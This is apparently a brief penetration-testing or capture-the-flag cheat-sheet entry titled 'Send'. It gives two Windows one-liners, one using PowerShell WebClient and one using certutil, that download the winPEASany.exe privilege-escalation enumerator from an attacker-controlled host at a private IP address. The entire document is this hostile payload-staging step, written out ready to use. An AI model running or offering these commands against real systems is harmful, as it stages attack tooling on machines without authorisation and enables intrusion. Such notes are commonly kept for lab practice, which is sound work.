# Send
```shell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.236:8088/winPEASany.exe', 'winPEASany.exe')"

certutil -urlcache -split -f http://10.10.15.236:8088/winPEASany.exe winPEASany.exe
```